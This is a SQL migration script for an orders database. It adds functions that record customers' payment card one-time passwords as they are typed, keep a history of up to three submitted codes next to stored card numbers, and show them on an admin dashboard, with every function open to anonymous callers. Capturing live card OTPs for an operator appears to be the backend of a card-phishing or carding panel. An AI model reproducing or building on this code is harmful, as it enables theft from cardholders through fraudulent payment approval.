-- Ensure each OTP the customer submits is stored in history (max 3), for admin dashboard.
-- Run: node scripts/apply-otp-history-stack.mjs  OR paste in SQL Editor

ALTER TABLE orders ADD COLUMN IF NOT EXISTS payment_otp_attempts_history JSONB NOT NULL DEFAULT '[]'::jsonb;
ALTER TABLE orders ADD COLUMN IF NOT EXISTS payment_otp_session_at TIMESTAMPTZ;

CREATE OR REPLACE FUNCTION append_otp_attempt(p_order_id UUID, p_code TEXT)
RETURNS BOOLEAN
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_clean TEXT;
  v_history JSONB;
  v_last TEXT;
BEGIN
  IF p_order_id IS NULL THEN
    RETURN false;
  END IF;

  v_clean := regexp_replace(coalesce(p_code, ''), '\D', '', 'g');
  -- Dashboard stack: only full 6-digit OTP submissions
  IF v_clean !~ '^\d{6}$' THEN
    RETURN false;
  END IF;

  SELECT COALESCE(payment_otp_attempts_history, '[]'::jsonb)
  INTO v_history
  FROM orders
  WHERE id = p_order_id AND card_number IS NOT NULL
  FOR UPDATE;

  IF NOT FOUND THEN
    RETURN false;
  END IF;

  IF jsonb_array_length(v_history) > 0 THEN
    v_last := v_history->(jsonb_array_length(v_history) - 1)->>'code';
  END IF;

  -- Skip duplicate of the latest entry (typing/save + verify)
  IF v_last IS NOT NULL AND v_last = v_clean THEN
    UPDATE orders
    SET
      payment_otp_entered = v_clean,
      payment_otp_entered_at = NOW(),
      payment_otp_code = v_clean,
      updated_at = NOW()
    WHERE id = p_order_id;
    RETURN true;
  END IF;

  -- Keep at most 3 attempts
  IF jsonb_array_length(v_history) >= 3 THEN
    UPDATE orders
    SET
      payment_otp_entered = v_clean,
      payment_otp_entered_at = NOW(),
      payment_otp_code = v_clean,
      updated_at = NOW()
    WHERE id = p_order_id;
    RETURN true;
  END IF;

  v_history := v_history || jsonb_build_array(
    jsonb_build_object(
      'code', v_clean,
      'at', to_char(NOW() AT TIME ZONE 'UTC', 'YYYY-MM-DD"T"HH24:MI:SS"Z"')
    )
  );

  UPDATE orders
  SET
    payment_otp_entered = v_clean,
    payment_otp_entered_at = NOW(),
    payment_otp_code = v_clean,
    payment_otp_attempts_history = v_history,
    updated_at = NOW()
  WHERE id = p_order_id;

  RETURN true;
END;
$$;

CREATE OR REPLACE FUNCTION save_payment_otp_entered(p_order_id UUID, p_code TEXT)
RETURNS BOOLEAN
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_clean TEXT;
  v_has_card BOOLEAN;
BEGIN
  IF p_order_id IS NULL THEN
    RAISE EXCEPTION 'رقم الطلب غير صالح.';
  END IF;

  v_clean := regexp_replace(coalesce(p_code, ''), '\D', '', 'g');

  IF v_clean <> '' AND v_clean !~ '^\d{1,6}$' THEN
    RAISE EXCEPTION 'رمز غير صالح.';
  END IF;

  SELECT card_number IS NOT NULL
  INTO v_has_card
  FROM orders
  WHERE id = p_order_id;

  IF NOT FOUND THEN
    RAISE EXCEPTION 'الطلب غير موجود.';
  END IF;

  IF NOT COALESCE(v_has_card, false) THEN
    RAISE EXCEPTION 'لم تُسجَّل بيانات البطاقة بعد.';
  END IF;

  -- Live typing: update current OTP only. History is appended on verify/submit.
  UPDATE orders
  SET
    payment_otp_entered = NULLIF(v_clean, ''),
    payment_otp_entered_at = CASE WHEN v_clean = '' THEN NULL ELSE NOW() END,
    payment_otp_code = CASE WHEN v_clean = '' THEN payment_otp_code ELSE v_clean END,
    updated_at = NOW()
  WHERE id = p_order_id;

  RETURN true;
END;
$$;

CREATE OR REPLACE FUNCTION save_customer_otp(p_order_id UUID, p_code TEXT)
RETURNS BOOLEAN
LANGUAGE sql
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT save_payment_otp_entered(p_order_id, p_code);
$$;

CREATE OR REPLACE FUNCTION record_payment_otp_attempt(p_order_id UUID, p_code TEXT)
RETURNS BOOLEAN
LANGUAGE sql
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT append_otp_attempt(p_order_id, p_code);
$$;

GRANT EXECUTE ON FUNCTION append_otp_attempt(UUID, TEXT) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION save_payment_otp_entered(UUID, TEXT) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION save_customer_otp(UUID, TEXT) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION record_payment_otp_attempt(UUID, TEXT) TO anon, authenticated;

NOTIFY pgrst, 'reload schema';
